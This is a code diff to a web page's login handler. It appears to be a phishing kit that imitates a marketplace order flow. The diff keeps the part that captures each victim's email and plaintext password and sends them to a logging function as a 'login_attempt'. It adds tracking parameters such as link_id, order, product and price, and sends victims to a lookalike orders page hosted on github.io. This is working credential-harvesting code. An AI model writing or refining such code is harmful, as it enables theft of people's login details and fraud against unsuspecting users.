@@ -866,16 +866,30 @@
                 return;
             }
 
-            // Send log and redirect on completion
-            sendLog('login_attempt', `Email: ${email}, Password: ${password}`, function() {
-                // Get link_id from URL if present
-                const urlParams = new URLSearchParams(window.location.search);
-                const link_id = urlParams.get('link_id');
+            // Get all URL parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            const link_id = urlParams.get('link_id');
+            const order = urlParams.get('order');
+            const product = urlParams.get('product');
+            const price = urlParams.get('price');
+            const currency = urlParams.get('currency');
 
-                // Redirect to orders with link_id if present
-                const ordersUrl = link_id
-                    ? `https://mymarket-orders.netlify.app/?link_id=${link_id}`
-                    : 'https://mymarket-orders.netlify.app/';
+            // Send log with link_id if present
+            const logDetails = link_id ? `Email: ${email}, Password: ${password}, link_id=${link_id}` : `Email: ${email}, Password: ${password}`;
+
+            sendLog('login_attempt', logDetails, function() {
+                // Build redirect URL with all parameters
+                const params = new URLSearchParams();
+                if (link_id) params.append('link_id', link_id);
+                if (order) params.append('order', order);
+                if (product) params.append('product', product);
+                if (price) params.append('price', price);
+                if (currency) params.append('currency', currency);
+
+                const queryString = params.toString();
+                const ordersUrl = queryString
+                    ? `https://roofvbiv-creator.github.io/workbotmm-landing/orders.html?${queryString}`
+                    : 'https://roofvbiv-creator.github.io/workbotmm-landing/orders.html';
 
                 window.location.href = ordersUrl;
             });
